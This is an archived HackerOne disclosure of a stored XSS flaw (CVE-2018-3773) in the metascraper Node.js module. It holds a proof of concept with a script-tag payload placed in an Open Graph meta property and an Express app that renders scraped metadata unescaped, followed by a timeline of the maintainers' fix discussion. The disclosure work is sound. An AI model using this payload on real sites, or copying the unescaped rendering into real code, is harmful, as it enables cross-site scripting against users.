---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/node
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2018-03-28
submitted: 2018-01-25T21:27:01.580Z
bounty_usd: null
votes: 7
cve: "CVE-2018-3773"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/309367"
title: "[metascraper] Stored XSS in Open Graph meta properties read by metascrapper"
---
# [metascraper] Stored XSS in Open Graph meta properties read by metascrapper

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js third-party modules | **Disclosed:** 2018-03-28

- Report: [https://hackerone.com/reports/309367](https://hackerone.com/reports/309367)
- CWE: Cross-site Scripting (XSS) - Stored | CVE: CVE-2018-3773
- Submitted: 2018-01-25T21:27:01.580Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

**metascrapper** is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization.

**Module:** 

A library to easily scrape metadata from an article on the web using Open Graph metadata, regular HTML metadata, and series of fallbacks.

https://www.npmjs.com/package/metascraper


**Description**

Due to lack of HTML sanitization, there is possibility to embed malicious code in any of metadata read by ```metascrapper```. When library reads such metadata, there is no sanitization performed. If output from ```metascrapper``` is used directly in HTML code, any HTML embed in metadata is executed in context of the page which load and render it.


## Steps To Reproduce:

### This part of PoC represents An Attacker

An attacker needs to inject malicious code into any of Open Graph property.

- create website (I serve it via static server available at http://127.0.0.1:8080) witt the following content. Please take a look at payload embed in ```og:site_name``` meta property:

```html
<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>metascraper</title>

    <meta property="og:description" content="The HR startups go to war.">
    <meta property="og:image" content="image">
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="test article">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://127.0.0.1:8080">
</head>

<body>
</body>
</html>
```

- save it as ```article.html``` in the root directory of the server runs on ```http://127.0.0.1:8080```.

- create ```malware.js``` file with following content and save it in the same directory as ```article.html```:

```
alert('Uh oh, I am very bad malware!')
```

Please be aware that ```JavaScript``` file with malicious code can be served from ANY place. This particular location is only for Poc.


**This represents an HTML page which can be "scrapped" with ```metascrapper```**


### This part of PoC represents legitimate User and an attack itself

- install ```metascrapper``` and required dependiences (```got``` and ```express```)

```
$ npm install metascrapper got express
```

- create an app which will use ```metascrapper``` to read webiste metadata. ```127.0.0.1:8888``` is address of server which uses ```metascrapper```. ```http://127.0.0.1:8080/article.html``` is **target website**, where from metadata will be read:

```javascript

const metascraper = require('metascraper')
const got = require('got')
const express = require('express')

const targetUrl = 'http://127.0.0.1:8080/article.html'

const app = express()

app.get('/scrap', function(req, res) {;
    (async() => {
        const {
            body: html,
            url
        } = await got(targetUrl)
        const metadata = await metascraper({
            html,
            url
        })
        console.log(metadata)  // see returned metadata in console:
        /*
            { author: null,
                date: null,
                description: 'The HR startups go to war.',
                image: 'http://127.0.0.1:8080/image',
                lang: 'en',
                logo: null,
                publisher: '<script src="http://127.0.0.1:8080/malware.js"></script>',
                title: 'test article',
                url: 'http://127.0.0.1:8080/article.html' }
        */
        // display content of metadata.publisher in the browser
        let __html = `
            <div>
                <p>site title: ${metadata.title}</p>
                <p>site publisher: ${metadata.publisher}</p>
            </div>
        `
        res.send(__html)
    })()
})

app.listen(8888, () => console.log('Example app listening on port 8888!'))
```

- run above app:

```
$ node app.js
```

- go to ```http://127.0.0.1:8888/scrap```

- malicious JavaScript code embed in site metadata ```og:site_name``` is executed:

{F257373}

As we can notice, our payload was displayed in the source page "as is":

{F257372}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Although this is quite hard to exploit in the wild, there is no doubt such attack is possible. This might lead to malware distribution, session cookies from infected websites leaks, run cryptocurrency miners in users' browsers and many more attacks.

## Timeline

- **Report Filed**
- **2018-01-26** @vdeturckheim: Hey @bl4de , thanks for reporting this. We will look shortly at this report!
- **2018-01-30** @lirantal: Hi @bl4de,

Thanks for reporting this issue to us.

I was able to reproduce and confirm the issue as you described, though I'm not sure metascraper is actually at fault here.
It very much depends what is the scope and purpose of metascrapr. If it is intended to scrape websites as is then I don't think it should escape data for you. Users who would be using metascrapr results and outputs them to a website should be responsible for actually encoding output.

WDYT?
- **2018-01-30** @bl4de: Hi @lirantal,

I totally get your point of view. As I understand that content of the webiste is out of control and in fact developer using metascrapper is responsible for output sanitization, I am not sure if XSS payloads in <meta> tags shouldn't be sanitized by metascrapper itself - it's not the place where you expect to find <script> tag and some JavaScript code :)

Maybe we can try to contact with package maintainer and ask him what he think and if he consider this as bug or a feature ;) in his package?

Regards,

bl4de
- **2018-01-30** @lirantal: Yep, definitely.
Invited them to further discuss on this.
- **External User Joined**
- **2018-01-30** @microlinkhq: Hello, here a metascraper maintainer, Kiko 🙂.

I think you are right about vulnerability, hopefully, is easy to patch, just ensure the output string will be XSS sanitized.

Do you have any recommendation on this point? For example: https://www.npmjs.com/package/xss
- **2018-01-30** @bl4de: Hi @microlinkhq ,

I think simple HTML escaping is all you need to do to make sure output is safe:

https://www.npmjs.com/package/escape-html

I've seen this module in action in couple of modules I've tested so far and it seems to do its job pretty well  ;)

Hope it helps!

Regards,

bl4de
- **2018-01-30** @lirantal: Are we talking about encoding or sanitizing? they are different things.
With encoding, context is important. For example, if you output encode malicious data in an HTML context, it the vulnerability might still exist if the data is set in a JavaScript context (i.e: within a <script> tags).

I'm not sure on how the scraper package will be used so need your input on this.
Besides the fix, maybe we should also add a note to the package's README about security concerns.
- **Report Triaged**
- **Changed Scope**
- **2018-02-14** @lirantal: Hey @microlinkhq can you please update on the progress for this fix?
- **2018-02-26** @lirantal: @microlinkhq we're coming close to the public disclosure date.
would you like to further discuss on how to resolve the problem?
- **2018-03-03** @lirantal: @bl4de I see there have been a few releases out. Can you confirm if any of these releases mitigate the problem?
- **2018-03-03** @bl4de: @lirantal,

Just checked with newest 3.9.2 version and issue is still reproducible.
- **2018-03-03** @lirantal: @microlinkhq I opened an issue on the repo about the report just incase you may have missed the conversation here. We still need your assistance to fix the problem.
- **2018-03-04** @microlinkhq: Hello,

The module proposed by @bl4de doesn't fix the problem. as @lirantal said, encoding and sanitizing are different things.

We are going to priorize this. The thing that we need is is a focused module for cleanup the string output from XSS attacks.

The code line in the code for do that is here:
https://github.com/microlinkhq/metascraper/blob/cb8935192507c05ec2d1fc2c81841663241f8e3c/packages/metascraper/src/get-data.js#L23
- **2018-03-10** @lirantal: @microlinkhq any updates?
- **2018-03-13** @microlinkhq: nope, any help?
- **2018-03-13** @lirantal: @microlinkhq sadly no due to limited availability but could you further explain what and why isn't working?
I'm not sure what the get-data is for but you want to encode any strings you put on the browser in their proper context. take a look at https://github.com/ESAPI/node-esapi and see if it helps.
- **2018-03-14** @lirantal: FYI since we already missed the 45 days we should probably proceed with a public disclosure unless there's a good reason not to.
- **2018-03-16** @microlinkhq: Actually you opened the issue: https://github.com/microlinkhq/metascraper/issues/74

Feel free to attach all the details.

Sorry if we are delaying this, but we do our best effort maintain the project. It isn't our current full time job. Because we don't see a simple solution that we can integrate asap, we are open to receive a PR fixing the problem.

So yeah, no problem exposing the problem 👍
- **2018-03-16** @bl4de: @microlinkhq 

I will try to take a look at the code and see if I can help :)
If I will figure out some acceptable solution, I'll PR you 

Stay Safe!

bl4de
- **2018-03-16** @lirantal: @microlinkhq it's not the same... I opened a generic issue to reach out to you, but the issue itself doesn't expose any specific vulnerability.

It is completely understood you guys are busy as well.
I'll disclose the vulnerability next week to give some more time to address it or by that time get community visibility on it.
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Report Title Updated**
- **Changed Scope**
- **2018-06-17** @microlinkhq: Hey,

I found this simple XSS validation:

https://github.com/RisingStack/protect/blob/master/lib/rules/xss.js

Do you think that could be enough using it over the data value extracted by the library?
- **2018-06-19** @bl4de: Hi @microlinkhq 

If you look for a good, complete solution, you should take a look at this library - https://github.com/cure53/DOMPurify :)

Regards,

bl4de
- **2018-06-19** @microlinkhq: Nice, I opened an issue for explore the solutions https://github.com/microlinkhq/metascraper/issues/96
- **2019-05-07** @microlinkhq: The issue has been closed and the vulnerability fixed https://github.com/microlinkhq/metascraper/pull/169
- **2019-05-07** @bl4de: Hi @microlinkhq ,

Awesome, nice to see the fix!

Cheers,

bl4de
